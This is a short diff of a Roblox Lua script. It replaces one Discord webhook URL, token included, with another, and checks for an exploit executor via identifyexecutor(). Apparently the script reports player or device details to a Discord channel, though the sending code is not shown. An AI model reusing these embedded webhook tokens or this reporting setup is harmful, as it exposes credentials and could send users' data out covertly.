@@ -9,7 +9,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local player = Players.LocalPlayer
 
 -- CONFIG
-local webhookUrl = "https://discord.com/api/webhooks/1365328680146173972/5jF0pM0LNd0dAzZPf3p3xHxE_uI6bJ6kr4xQcIBPyGn5sRF7L-1Ca6kGKz5n83OyyUC5"
+local webhookUrl = "https://discord.com/api/webhooks/1407895931008847923/wyOcb64GuOOG3TvLTydnivsIk1N__nkx-TukPfPMW2zb3n6ulnMI7G6ydT815lumBQ_N"
 local executor = identifyexecutor and identifyexecutor() or "Unknown"
 
 -- Device detection
